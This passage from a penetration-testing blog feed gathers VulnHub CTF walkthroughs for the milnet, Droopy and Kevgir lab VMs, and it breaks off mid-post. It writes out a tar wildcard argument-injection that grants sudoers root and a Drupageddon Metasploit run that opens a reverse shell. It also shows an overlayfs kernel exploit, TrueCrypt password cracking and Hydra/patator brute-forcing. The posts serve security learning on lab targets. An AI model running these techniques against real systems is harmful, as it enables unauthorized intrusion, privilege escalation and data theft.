<p>We can use these to inject arbitrary commands. In other words, run the desired command when the checkpoint is reached. To test it out, I created the files as follows:</p>

<p><code>
echo "" &gt; --checkpoint=1
echo "" &gt; "--checkpoint-action=exec=sh shell.sh"
echo "/usr/bin/whoami &gt; /tmp/readme" &gt; shell.sh
chmod +x shell.sh
</code></p>

<p>And now when tar is run, it will pick up the files I created as parameters:</p>

<p><code>
$ ls
--checkpoint-action=exec=sh shell.sh
--checkpoint=1
bomb.jpg
bomb.php
content.php
index.php
info.php
main.php
mj.jpg
nav.php
props.php
shell.sh
</code></p>

<p>I waited for a bit and then:</p>

<p><code>
$ ls /tmp
readme
systemd-private-b21f86620e1c4dbf8ba8443074d9367f-systemd-timesyncd.service-flEglg
vmware-root
$ cat /tmp/readme
root
</code></p>

<p>Awesome! It works! And this is a technique I had no idea about! So now I&rsquo;ve changed the commands to give my low-privilege user full permissions:</p>

<p><code>
$ echo 'echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; shell.sh
$ cat shell.sh
echo "www-data  ALL=(ALL) NOPASSWD:ALL" &gt;&gt; /etc/sudoers
</code></p>

<p>Again, after some waiting, the root powers are here!</p>

<p>```
$ sudo su
id
uid=0(root) gid=0(root) groups=0(root)
cat /root/credits.txt</p>

<pre><code>    ,----,                                                               
  ,/   .`|                                                               
,`   .'  :  ,---,                          ,---,.                        
</code></pre>

<p>  ;    ;     /,&mdash;.&lsquo; |                        ,&rsquo;  .&lsquo; |                  ,&mdash;&ndash;,
.&rsquo;<strong>_,/    ,&lsquo; |  |  :                      ,&mdash;&ndash;.&rsquo;   |      ,&mdash;&ndash;,     ,&mdash;&ndash;.&lsquo;|
|    :     |  :  :  :                      |   |   .&rsquo;  ,&ndash;+&ndash;. /  |    |   | :
;    |.&lsquo;;  ;  :  |  |,&mdash;.   ,&mdash;&ndash;.          :   :  |&ndash;, ,&mdash;.&rsquo;|&lsquo;   |    |   | |
`&mdash;&mdash;&rsquo;  |  |  |  :  &lsquo;   |  /     \         :   |  ;/||   |  ,&ldquo;&rsquo; |  ,&mdash;.</strong>| |</p>

<pre><code>'   :  ;  |  |   /' : /    /  |        |   :   .'|   | /  | | /   ,'   | 
|   |  '  '  :  | | |.    ' / |        |   |  |-,|   | |  | |.   '  /  | 
'   :  |  |  |  ' | :'   ;   /|        '   :  ;/||   | |  |/ '   ; |:  | 
;   |.'   |  :  :_:,''   |  / |        |   |    \|   | |--'  |   | '/  ' 
'---'     |  | ,'    |   :    |        |   :   .'|   |/      |   :    :| 
          `--''       \   \  /         |   | ,'  '---'        \   \  /   
                       `----'          `----'                  `----'    
</code></pre>

<p>This was milnet for #vulnhub by @teh_warriar
I hope you enjoyed this vm!</p>

<p>If you liked it drop me a line on twitter or in #vulnhub.</p>

<p>I hope you found the clue:
/home/langman/SDINET/DefenseCode_Unix_WildCards_Gone_Wild.txt
I was sitting on the idea for using this technique for a BOOT2ROOT VM prives for a long time&hellip;</p>

<p>This VM was inspired by The Cuckoo&rsquo;s Egg.
If you have not read it give it a try:
<a href="http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/">http://www.amazon.com/Cuckoos-Egg-Tracking-Computer-Espionage/dp/1416507787/</a>
```</p>

<p>Great challenge, dropping some old-school knowledge about getting command injection by exploiting Unix wildcards!</p>

<p>```</p>

<hr />

<p>/ Increased knowledge will help you now. \
\ Have mate&rsquo;s phone bugged.              /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Dropping Droopy]]></title>
    <link href="http://chousensha.github.io/blog/2018/05/04/dropping-droopy/"/>
    <updated>2018-05-04T13:05:08-04:00</updated>
    <id>http://chousensha.github.io/blog/2018/05/04/dropping-droopy</id>
    <content type="html"><![CDATA[<p>I&rsquo;m back in the game with preparing for OSCP, and resuming the VulnHub machines. Today&rsquo;s target is Droopy. The author left 2 hints for this challenge:</p>

<p>1.) Grab a copy of the rockyou wordlist.</p>

<p>2.) It&rsquo;s fun to read other people&rsquo;s email.</p>

<!-- more -->


<p><code>
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Welcome to La fraude fiscale des grandes soci\xC3\xA9t\xC3\xA9s | La fraud...
</code></p>

<p>Looks like this will be a web-based challenge.</p>

<p><img class="center" src="/images/pentest/droopy.png" title="&lsquo;droopy&rsquo; &lsquo;droopy&rsquo;" ></p>

<p>There are quite a few entries inside robots.txt:</p>

<p>```
User-agent: *
Crawl-delay: 10</p>

<h1>Directories</h1>

<p>Disallow: /includes/
Disallow: /misc/
Disallow: /modules/
Disallow: /profiles/
Disallow: /scripts/
Disallow: /themes/</p>

<h1>Files</h1>

<p>Disallow: /CHANGELOG.txt
Disallow: /cron.php
Disallow: /INSTALL.mysql.txt
Disallow: /INSTALL.pgsql.txt
Disallow: /INSTALL.sqlite.txt
Disallow: /install.php
Disallow: /INSTALL.txt
Disallow: /LICENSE.txt
Disallow: /MAINTAINERS.txt
Disallow: /update.php
Disallow: /UPGRADE.txt
Disallow: /xmlrpc.php</p>

<h1>Paths (clean URLs)</h1>

<p>Disallow: /admin/
Disallow: /comment/reply/
Disallow: /filter/tips/
Disallow: /node/add/
Disallow: /search/
Disallow: /user/register/
Disallow: /user/password/
Disallow: /user/login/
Disallow: /user/logout/</p>

<h1>Paths (no clean URLs)</h1>

<p>Disallow: /?q=admin/
Disallow: /?q=comment/reply/
Disallow: /?q=filter/tips/
Disallow: /?q=node/add/
Disallow: /?q=search/
Disallow: /?q=user/password/
Disallow: /?q=user/register/
Disallow: /?q=user/login/
Disallow: /?q=user/logout/
```</p>

<p>Sifting through the entries, I found the exact version on Drupal is 7.30, from the /CHANGELOG.txt file. Googling an exploit for this version led me to..<a href="https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon">Drupageddon</a>!!  Or more official, CVE-2014-3704, which describes a SQL injection vulnerability in Drupal. I fired up Metasploit for the exploit:</p>

<p>```
msf > use exploit/multi/http/drupal_drupageddon
msf exploit(drupal_drupageddon) > info</p>

<pre><code>   Name: Drupal HTTP Parameter Key/Value SQL Injection
 Module: exploit/multi/http/drupal_drupageddon
</code></pre>

<p>   Platform: PHP</p>

<pre><code>   Arch: php
</code></pre>

<p> Privileged: No</p>

<pre><code>License: Metasploit Framework License (BSD)
   Rank: Excellent
</code></pre>

<p>  Disclosed: 2014-10-15</p>

<p>Provided by:
  SektionEins
  Christian Mehlmauer <a href="&#109;&#97;&#x69;&#108;&#x74;&#111;&#58;&#70;&#105;&#x72;&#x65;&#70;&#x61;&#114;&#116;&#x40;&#x67;&#x6d;&#x61;&#105;&#x6c;&#46;&#99;&#x6f;&#109;">&#x46;&#x69;&#114;&#x65;&#x46;&#97;&#114;&#116;&#x40;&#103;&#x6d;&#x61;&#105;&#x6c;&#x2e;&#x63;&#x6f;&#109;</a>
  Brandon Perry</p>

<p>Available targets:
  Id  Name</p>

<hr />

<p>  0   Drupal 7.0 &ndash; 7.31</p>

<p>Basic options:
  Name       Current Setting  Required  Description</p>

<hr />

<p>  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][&hellip;]
  RHOST      192.168.217.139  yes       The target address
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /                yes       The target URI of the Drupal installation
  VHOST                       no        HTTP server virtual host</p>

<p>Payload information:</p>

<p>Description:
  This module exploits the Drupal HTTP Parameter Key/Value SQL
  Injection (aka Drupageddon) in order to achieve a remote shell on
  the vulnerable instance. This module was tested against Drupal 7.0
  and 7.31 (was fixed in 7.32).</p>

<p>References:
  <a href="https://cvedetails.com/cve/CVE-2014-3704/">https://cvedetails.com/cve/CVE-2014-3704/</a>
  <a href="https://www.drupal.org/SA-CORE-2014-005">https://www.drupal.org/SA-CORE-2014-005</a>
  <a href="http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html">http://www.sektioneins.de/en/advisories/advisory-012014-drupal-pre-auth-sql-injection-vulnerability.html</a>
msf exploit(drupal_drupageddon) > exploit</p>

<p>[<em>] Started reverse TCP handler on 192.168.217.132:4444
[</em>] Testing page
[<em>] Creating new user yCTZcwgtLV:WLhkIYdDtB
[</em>] Logging in as yCTZcwgtLV:WLhkIYdDtB
[<em>] Trying to parse enabled modules
[</em>] Enabling the PHP filter module
[<em>] Setting permissions for PHP filter module
[</em>] Getting tokens from create new article page
[<em>] Calling preview page. Exploit should trigger&hellip;
[</em>] Sending stage (37543 bytes) to 192.168.217.139
[*] Meterpreter session 1 opened (192.168.217.132:4444 &ndash;> 192.168.217.139:51854) at 2018-05-04 13:48:44 -0400
```</p>

<p>I dropped into a shell and checked the kernel version:</p>

<p><code>
meterpreter &gt; shell
Process 1385 created.
Channel 0 created.
uname -a
Linux droopy 3.13.0-43-generic #72-Ubuntu SMP Mon Dec 8 19:35:06 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
</code></p>

<p>I ran the 3.13 version through the exploit check part of my <a href="https://github.com/chousensha/linux_privcheck">privcheck</a> script:</p>

<p>```
python linux_privcheck.py
Kernel version is 3.13</p>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: Double-free usb-midi SMEP Local Privilege Escalation
CVE: CVE-2016-2384
Source code: <a href="https://www.exploit-db.com/exploits/41999/">https://www.exploit-db.com/exploits/41999/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: overlayfs Privilege Escalation
CVE: CVE-2015-1328
Source code: <a href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: ptrace/sysret Privilege Escalation
CVE: CVE-2014-4699
Source code: <a href="https://www.exploit-db.com/exploits/34134/">https://www.exploit-db.com/exploits/34134/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: CLONE_NEWUSER|CLONE_FS Privilege Escalation
CVE: N/A
Source code: <a href="https://www.exploit-db.com/exploits/38390/">https://www.exploit-db.com/exploits/38390/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: b43 Wireless Driver Privilege Escalation
CVE: CVE-2013-2852
Source code: <a href="https://www.exploit-db.com/exploits/38559/">https://www.exploit-db.com/exploits/38559/</a></p>

<h6>#</h6>

<h6>#</h6>

<p>POTENTIALLY VULNERABLE TO
Name: open-time Capability file_ns_capable() Privilege Escalation
CVE: CVE-2013-1959
Source code: <a href="https://www.exploit-db.com/exploits/25450/">https://www.exploit-db.com/exploits/25450/</a></p>

<h6>#</h6>

<p>```</p>

<p>Ubuntu and overlayfs exploit = PWN! I uploaded the exploit source code to the target via Meterpreter:</p>

<p><code>
meterpreter &gt; upload /root/37292.c /tmp/
[*] uploading  : /root/37292.c -&gt; /tmp/
[*] uploaded   : /root/37292.c -&gt; /tmp//37292.c
</code></p>

<p>I went back to the shell, and compiled the exploit and made it executable. Droopy is rooted!</p>

<p>```
gcc 37292.c -o overlayfs
chmod +x overlayfs
./overlayfs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can&rsquo;t access tty; job control turned off</p>

<h1>whoami</h1>

<p>root
```</p>

<p>But the challenge is not over here. We are root, but remember the hints! We didn&rsquo;t get to do anything with them. I went to the <code>/var/mail</code> directory and found the following message:</p>

<p>```</p>

<h1>cat www-data</h1>

<p>From Dave <a href="&#109;&#x61;&#105;&#108;&#116;&#x6f;&#x3a;&#100;&#x61;&#x76;&#101;&#64;&#x64;&#x72;&#x6f;&#111;&#112;&#121;&#46;&#101;&#120;&#x61;&#x6d;&#x70;&#x6c;&#x65;&#x2e;&#99;&#x6f;&#109;">&#100;&#x61;&#x76;&#101;&#x40;&#x64;&#114;&#111;&#x6f;&#x70;&#121;&#x2e;&#x65;&#x78;&#97;&#109;&#x70;&#108;&#101;&#x2e;&#x63;&#x6f;&#x6d;</a> Wed Thu 14 Apr 04:34:39 2016
Date: 14 Apr 2016 04:34:39 +0100
From: Dave <a href="&#109;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#x64;&#x61;&#118;&#101;&#x40;&#x64;&#x72;&#x6f;&#111;&#112;&#121;&#46;&#x65;&#x78;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#x64;&#x61;&#x76;&#x65;&#64;&#x64;&#114;&#x6f;&#111;&#x70;&#x79;&#x2e;&#101;&#120;&#97;&#109;&#112;&#x6c;&#101;&#46;&#99;&#111;&#109;</a>
Subject: rockyou with a nice hat!
Message-ID: <a href="&#109;&#x61;&#x69;&#108;&#x74;&#x6f;&#x3a;&#55;&#x33;&#48;&#50;&#54;&#50;&#x35;&#54;&#x38;&#x40;&#x65;&#120;&#97;&#109;&#x70;&#x6c;&#101;&#x2e;&#99;&#111;&#109;">&#55;&#51;&#48;&#50;&#54;&#x32;&#53;&#x36;&#56;&#x40;&#101;&#x78;&#x61;&#109;&#112;&#108;&#x65;&#46;&#x63;&#111;&#109;</a>
X-IMAP: 0080081351 0000002016
Status: NN</p>

<p>George,</p>

<p>   I&rsquo;ve updated the encrypted file&hellip; You didn&rsquo;t leave any
hints for me. The password isn&rsquo;t longer than 11 characters
and anyway, we know what academy we went to, don&rsquo;t you&hellip;?</p>

<p>I&rsquo;m sure you&rsquo;ll figure it out it won&rsquo;t rockyou too much!</p>

<p>If you are still struggling, remember that song by The Jam</p>

<p>Later,
Dave
```</p>

<p>Here it is, another reference to the rockyou list! I&rsquo;ve looked around and found the mentioned encrypted file at <code>/root/dave.tc</code>. The <em>tc</em> extension is for a Truecrypt virtual encrypted disk. So now we know what to crack, and roughly how to do it.</p>

<p>The rockyou.txt file has over 14 million entries, so we&rsquo;re gonna need to make good use of the hints:</p>

<p><code>
wc -l /usr/share/wordlists/rockyou.txt
14344392 /usr/share/wordlists/rockyou.txt
</code></p>

<p>I made a new file with only the entries that were 11 characters long:</p>

<p><code>
grep -E '^.{11}$' /usr/share/wordlists/rockyou.txt &gt; /root/rocked.txt
wc -l rocked.txt
865891 rocked.txt
</code></p>

<p>And then I created a final file with only the entries that had &ldquo;academy&rdquo; in them:</p>

<p><code>
grep academy rocked.txt &gt; rockademy.txt
wc -l rockademy.txt
16 rockademy.txt
</code></p>

<p>From over 14 million to 16 entries?! Sounds too good to be true! Let&rsquo;s put it to the test. First, I had to transfer the encrypted file to my machine. I copied <em>dave.tc</em> to /tmp and then downloaded it from there with meterpreter:</p>

<p><code>
meterpreter &gt; download /tmp/dave.tc
[*] Downloading: /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 1.00 MiB of 5.00 MiB (20.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 2.00 MiB of 5.00 MiB (40.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 3.00 MiB of 5.00 MiB (60.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 4.00 MiB of 5.00 MiB (80.0%): /tmp/dave.tc -&gt; dave.tc
[*] Downloaded 5.00 MiB of 5.00 MiB (100.0%): /tmp/dave.tc -&gt; dave.tc
[*] download   : /tmp/dave.tc -&gt; dave.tc
</code></p>

<p>For cracking the file, Kali already comes with TrueCrack preinstalled:</p>

<blockquote><p>TrueCrack is a brute-force password cracker for TrueCrypt volumes. It works on Linux
and it is optimized for Nvidia Cuda technology. It supports:</p>

<p>   PBKDF2 (defined in PKCS5 v2.0) based on key derivation functions: Ripemd160, Sha512
and Whirlpool.
   XTS block cipher mode for hard disk encryption based on encryption algorithms: AES,
SERPENT, TWOFISH.
   File-hosted (container) and Partition/device-hosted.
   Hidden volumes and Backup headers.</p>

<p>TrueCrack is able to perform a brute-force attack based on:</p>

<p>   Dictionary: read the passwords from a file of words.
   Alphabet: generate all passwords of given length from given alphabet.</p>

<p>TrueCrack works on gpu and cpu</p></blockquote>

<p>```
truecrack
TrueCrack v3.0
Website: <a href="http://code.google.com/p/truecrack">http://code.google.com/p/truecrack</a>
Contact us: <a href="&#109;&#x61;&#105;&#x6c;&#116;&#111;&#58;&#105;&#110;&#102;&#111;&#x74;&#114;&#x75;&#x65;&#x63;&#x72;&#97;&#99;&#x6b;&#64;&#x67;&#109;&#97;&#x69;&#108;&#x2e;&#99;&#111;&#109;">&#105;&#110;&#x66;&#111;&#x74;&#x72;&#117;&#x65;&#x63;&#114;&#97;&#x63;&#x6b;&#64;&#103;&#109;&#97;&#105;&#x6c;&#46;&#x63;&#x6f;&#x6d;</a>
Bruteforce password cracker for Truecrypt volume. Optimazed with Nvidia Cuda technology.
Based on TrueCrypt, freely available at <a href="http://www.truecrypt.org/">http://www.truecrypt.org/</a>
Copyright &copy; 2011 by Luca Vaccaro.</p>

<p>Usage:
 truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -w &lt;wordlist_file> [-b &lt;parallel_block>]
 truecrack -t &lt;truecrypt_file> -k &lt;ripemd160|sha512|whirlpool> -c <charset> [-s <minlength>] -m <maxlength> [-b &lt;parallel_block>]</p>

<p>Options:
 -h &mdash;help                      Display this information.
 -t &mdash;truecrypt &lt;truecrypt_file>    Truecrypt volume file.
 -k &mdash;key <ripemd160 | sha512 | whirlpool>      Key derivation function (default ripemd160).
 -b &mdash;blocksize &lt;parallel_blocks>       Number of parallel computations (board dependent).
 -w &mdash;wordlist &lt;wordlist_file>      File of words, for Dictionary attack.
 -c &mdash;charset <alphabet>        Alphabet generator, for Alphabet attack.
 -s &mdash;startlength <minlength>       Starting length of passwords, for Alphabet attack (default 1).
 -m &mdash;maxlength <maxlength>     Maximum length of passwords, for Alphabet attack.
 -r &mdash;restore <number>          Restore the computation.
 -v &mdash;verbose                   Show computation messages.</p>

<p>Sample:
 Dictionary mode: truecrack &mdash;truecrypt ./volume &mdash;wordlist ./dictionary.txt
 Charset mode: truecrack &mdash;truecrypt ./volume &mdash;charset ./dictionary.txt &mdash;maxlength 10
```</p>

<p>The moment of truth! It didn&rsquo;t work the first try, but then I specified the key function as SHA512:</p>

<p><code>
truecrack --truecrypt dave.tc -k sha512 --wordlist rockademy.txt
TrueCrack v3.0
Website: http://code.google.com/p/truecrack
Contact us: infotruecrack@gmail.com
Found password:     "etonacademy"
Password length:    "12"
Total computations: "10"
</code></p>

<p>It worked! Now all that remains is to open the volume and snoop around:</p>

<p><code>
cryptsetup open --type tcrypt dave.tc hidden
Enter passphrase:
mkdir -p /mnt/tcrypt
mount /dev/mapper/hidden /mnt/tcrypt/
root@kali:/mnt/tcrypt# ls -la
total 20
drwxr-xr-x 6 root root  1024 Apr 12  2016 .
drwxr-xr-x 6 root root  4096 May  4 16:20 ..
drwxr-xr-x 2 root root  1024 Apr 12  2016 buller
drwx------ 2 root root 12288 Apr 12  2016 lost+found
drwxr-xr-x 2 root root  1024 Apr 12  2016 panama
drwxr-xr-x 3 root root  1024 Apr 12  2016 .secret
</code></p>

<p>A hidden directory..with another hidden directory inside it:</p>

<p><code>
root@kali:/mnt/tcrypt/.secret# ls -la
total 64
drwxr-xr-x 3 root root  1024 Apr 12  2016 .
drwxr-xr-x 6 root root  1024 Apr 12  2016 ..
-rw-r--r-- 1 root root 61118 Feb 25  2016 piers.png
drwxr-xr-x 2 root root  1024 Apr 12  2016 .top
</code></p>

<p>And finally, the flag!</p>

<p>```
root@kali:/mnt/tcrypt/.secret/.top# cat flag.txt</p>

<h6>#</h6>

<h1><strong><em> </em></strong>  _  _  <strong><em> </em></strong>    _ <strong><strong><em> _   _ _      _ </em></strong></strong> <strong><em> </em></strong>  _  _  ___</h1>

<h1>/ <strong>/ _ \| \| |/ </strong>| _ \  /<em>_   </em>| | | | |    /<em>_   </em>|<em> </em>/ _ \| \| |/ __|</h1>

<h1>| (<em>| (</em>) | .<code>| (_ |   / / _ \| | | |_| | |__ / _ \| |  | | (_) | .</code> |__ \</h1>

<h1>_<strong>_</strong>/|<em>|_|___|</em>|<em>\/</em>/ __|  _<strong>/|</strong><strong>/<em>/ __| |</em></strong>_<strong>/|<em>|_||</em></strong>/</h1>

<h1>#</h1>

<h6>#</h6>

<p>Firstly, thanks for trying this VM. If you have rooted it, well done!</p>

<p>Shout-outs go to #vulnhub for hosting a great learning tool. A special thanks
goes to barrebas and junken for help in testing and final configuration.</p>

<pre><code>                                                                --knightmare
</code></pre>

<p>```</p>

<p>Nice challenge that involved adjusting a wordlist and TrueCrypt cracking! It rocked!</p>

<p>```</p>

<hr />

<p>/ You will be awarded a medal for        \
\ disregarding safety in saving someone. /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwning Kevgir]]></title>
    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
    <updated>2017-12-02T14:08:05-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<p><code>
PORT      STATE SERVICE     VERSION
25/tcp    open  ftp         vsftpd 3.0.2
|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D
</code></p>

<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<p>```
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt <a href="ftp://192.168.217.128:25">ftp://192.168.217.128:25</a>
Hydra v8.6 &copy; 2017 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-12-02 15:08:02
[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
[DATA] attacking <a href="ftp://192.168.217.128:25/">ftp://192.168.217.128:25/</a>
[25][ftp] host: 192.168.217.128   login: admin   password: admin
```</p>

<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<p><code>
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Kevgir VM
</code></p>

<p><img class="center" src="/images/pentest/kevgir/80.jpg" title="&lsquo;port 80&rsquo; &lsquo;port 80 apache&rsquo;" ></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<p>```
Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: patator module &mdash;help</p>

<p>Available modules:
  + ftp_login     : Brute-force FTP
  + ssh_login     : Brute-force SSH
  + telnet_login  : Brute-force Telnet
  + smtp_login    : Brute-force SMTP
  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
  + finger_lookup : Enumerate valid users using Finger
  + http_fuzz     : Brute-force HTTP
  + pop_login     : Brute-force POP3
  + pop_passd     : Brute-force poppassd (<a href="http://netwinsite.com/poppassd/">http://netwinsite.com/poppassd/</a>)
  + imap_login    : Brute-force IMAP4
  + ldap_login    : Brute-force LDAP
  + smb_login     : Brute-force SMB
  + smb_lookupsid : Brute-force SMB SID-lookup
  + rlogin_login  : Brute-force rlogin
  + vmauthd_login : Brute-force VMware Authentication Daemon
  + mssql_login   : Brute-force MSSQL
  + oracle_login  : Brute-force Oracle
  + mysql_login   : Brute-force MySQL
  + mysql_query   : Brute-force MySQL queries
  + pgsql_login   : Brute-force PostgreSQL
  + vnc_login     : Brute-force VNC
  + dns_forward   : Forward lookup names
  + dns_reverse   : Reverse lookup subnets
  + snmp_login    : Brute-force SNMP v1/2/3
  + unzip_pass    : Brute-force the password of encrypted ZIP files
  + keystore_pass : Brute-force the password of Java keystore files
  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
  + tcp_fuzz      : Fuzz TCP services
  + dummy_test    : Testing module
```</p>

<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<p><code>
cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt
</code></p>

<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<p>```
patator http_fuzz &mdash;help
Patator v0.6 (<a href="http://code.google.com/p/patator/">http://code.google.com/p/patator/</a>)
Usage: http_fuzz &lt;module-options &hellip;> [global-options &hellip;]</p>

<p>Examples:
  http_fuzz url=<a href="http://10.0.0.1/FILE0">http://10.0.0.1/FILE0</a> 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
  http_fuzz url=<a href="http://10.0.0.1/manager/html">http://10.0.0.1/manager/html</a> user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
  http_fuzz url=<a href="http://10.0.0.1/phpmyadmin/index.php">http://10.0.0.1/phpmyadmin/index.php</a> method=POST body=&lsquo;pma_username=root&amp;pma_password=FILE0&amp;server=1&amp;lang=en&rsquo; 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep=&lsquo;Cannot log in to the MySQL server&rsquo;</p>

<p>Module options:
  url           : target url (scheme://host[:port]/path?query)
  body          : body data
  header        : use custom headers
  method        : method to use [GET | POST | HEAD | &hellip;]
  auto_urlencode: automatically perform URL-encoding [1|0]
  user_pass     : username and password for HTTP authentication (user:pass)
  auth_type     : type of HTTP authentication [basic | digest | ntlm]
  follow        : follow any Location redirect [0|1]
  max_follow    : redirection limit [5]
  accept_cookie : save received cookies to issue them in future requests [0|1]
  http_proxy    : HTTP proxy to use (host:port)
  ssl_cert      : client SSL certificate file (cert+key in PEM format)
  timeout_tcp   : seconds to wait for a TCP handshake [10]
  timeout       : seconds to wait for a HTTP response [20]
  before_urls   : comma-separated URLs to query before the main request
  before_egrep  : extract data from the before_urls response to place in the main request
  after_urls    : comma-separated URLs to query after the main request
  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
  persistent    : use persistent connections [1|0]</p>

<p>Global options:
  &mdash;version            show program&rsquo;s version number and exit
  -h, &mdash;help           show this help message and exit</p>

<p>  Execution:</p>

<pre><code>-x arg             actions and conditions, see Syntax below
--start=N          start from offset N in the wordlist product
--stop=N           stop at offset N
--resume=r1[,rN]*  resume previous run
-e arg             encode everything between two tags, see Syntax below
-C str             delimiter string in combo files (default is ':')
-X str             delimiter string in conditions (default is ',')
</code></pre>

<p>  Optimization:</p>

<pre><code>--rate-limit=N     wait N seconds between tests (default is 0)
--max-retries=N    skip payload after N failures (default is 4) (-1 for
                   unlimited)
-t N, --threads=N  number of threads (default is 10)
</code></pre>

<p>  Logging:</p>

<pre><code>-l DIR             save output and response data into DIR
-L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
                   (DIR defaults to '/tmp/patator')
</code></pre>

<p>  Debugging:</p>

<pre><code>-d, --debug        enable debug messages
</code></pre>

<p>Syntax:
 -x actions:conditions</p>

<pre><code>actions    := action[,action]*
action     := "ignore" | "retry" | "free" | "quit" | "reset"
conditions := condition=value[,condition=value]*
condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"

ignore      : do not report
retry       : try payload again
free        : dismiss future similar payloads
quit        : terminate execution now
reset       : close current connection in order to reconnect next time

code        : match status code
size        : match size (N or N-M or N- or -N)
time        : match time (N or N-M or N- or -N)
mesg        : match message
fgrep       : search for string in mesg
egrep       : search for regex in mesg
clen        : match Content-Length header (N or N-M or N- or -N)
</code></pre>

<p>For example, to ignore all redirects to the home page:
&hellip; -x ignore:code=302,fgrep=&lsquo;Location: /home.html&rsquo;</p>

<p> -e tag:encoding</p>

<pre><code>tag        := any unique string (eg. T@G or _@@_ or ...)
encoding   := "url" | "sha1" | "md5" | "hex" | "b64"

url         : url encode
sha1        : hash in sha1
md5         : hash in md5
hex         : encode in hexadecimal
b64         : encode in base64
</code></pre>

<p>For example, to encode every password in base64:
&hellip; host=10.0.0.1 user=admin password=<em>@@</em>FILE0<em>@@</em> -e <em>@@</em>:b64</p>

<p>Please read the README inside for more examples and usage information.
```</p>

<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<p><code>
